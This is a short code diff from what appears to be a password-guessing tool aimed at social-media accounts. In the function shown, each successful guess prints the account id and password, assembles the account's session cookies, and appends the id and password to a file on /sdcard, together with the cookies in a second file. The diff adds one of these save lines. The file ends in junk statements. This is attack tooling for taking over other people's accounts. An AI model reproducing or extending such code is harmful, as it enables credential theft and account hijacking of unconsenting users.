@@ -770,7 +770,8 @@ def M_file_44(ids,names,passlist):
                                         print('\r\x1b[1;92m<[𝐃𝒂𝒓𝒌-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         coki="sb=shawXD01;"+coki
-                                    open('/sdcard/𝐃𝒂𝒓𝒌_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+                                        open('/sdcard/𝐃𝒂𝒓𝒌_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
+                                        open('/sdcard/𝐃𝒂𝒓𝒌_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
@@ -907,4 +908,3 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
-      
